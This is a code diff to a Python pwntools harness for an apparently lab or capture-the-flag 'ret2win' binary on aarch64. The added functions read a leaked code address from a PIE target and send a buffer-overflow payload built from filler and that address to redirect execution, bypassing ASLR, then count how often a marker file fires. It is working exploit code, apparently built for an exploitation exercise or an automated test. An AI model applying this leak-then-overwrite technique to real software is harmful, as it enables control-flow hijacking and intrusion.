@@ -31,7 +31,7 @@ from pwn import (
 context.arch = "aarch64"
 context.log_level = "error"
 
-BIN = "/work/ret2win"
+BIN = os.environ.get("TARGET_BIN", "/work/ret2win")
 S = {"io": None, "gdb": None}
 SENT = "<<GDBQ>>"   # unique gdb prompt sentinel; keeps gdb output framed and OFF the protocol stdout
 
@@ -228,6 +228,56 @@ def op_exploit(a):
             with open("/tmp/objective_marker") as f: content = f.read()
         fires += 1 if fired else 0
         results.append({"exit": rc, "marker_fired": fired, "marker_content": content})
+    return {"times": times, "fires": fires, "reliability": fires / times if times else 0, "results": results}
+
+
+def _read_leak(io):
+    # Parse a "leak: 0x....\n" line from the target and return the address int.
+    line = io.recvuntil(b"\n", timeout=5)
+    m = __import__("re").search(rb"leak:\s*0x([0-9a-fA-F]+)", line)
+    return int(m.group(1), 16) if m else None
+
+def op_leak(a):
+    # Info-leak primitive: start the (PIE) target and read its leaked code pointer.
+    # Under ASLR this differs every run, which is exactly why a hardcoded exploit fails.
+    io = process([BIN])
+    try:
+        addr = _read_leak(io)
+    finally:
+        try: io.close()
+        except Exception: pass
+    return {"leaked_addr": addr, "leaked_hex": hex(addr) if addr is not None else None}
+
+def op_exploit_leak(a):
+    # Leak-then-ret2win, per run: read THIS run's leaked win() address, then send
+    # <offset> filler + p64(leaked). Defeats ASLR because the address is fresh each run.
+    off = int(a["offset"])
+    times = int(a.get("times", 5))
+    marker_env = a.get("marker", "")
+    fires, results = 0, []
+    for _ in range(times):
+        try: os.remove("/tmp/objective_marker")
+        except FileNotFoundError: pass
+        env = dict(os.environ)
+        if marker_env: env["AEGIS_MARKER"] = marker_env
+        io = process([BIN], env=env)
+        leaked = None
+        try:
+            leaked = _read_leak(io)
+            if leaked is None:
+                rc = None
+            else:
+                payload = b"A" * off + leaked.to_bytes(8, "little")
+                io.send(payload)
+                rc = io.wait(timeout=5)
+        except Exception:
+            rc = None
+        finally:
+            try: io.close()
+            except Exception: pass
+        fired = os.path.exists("/tmp/objective_marker")
+        fires += 1 if fired else 0
+        results.append({"leaked": hex(leaked) if leaked else None, "exit": rc, "marker_fired": fired})
     return {"times": times, "fires": fires, "reliability": fires / times if times else 0, "results": results}
 
 
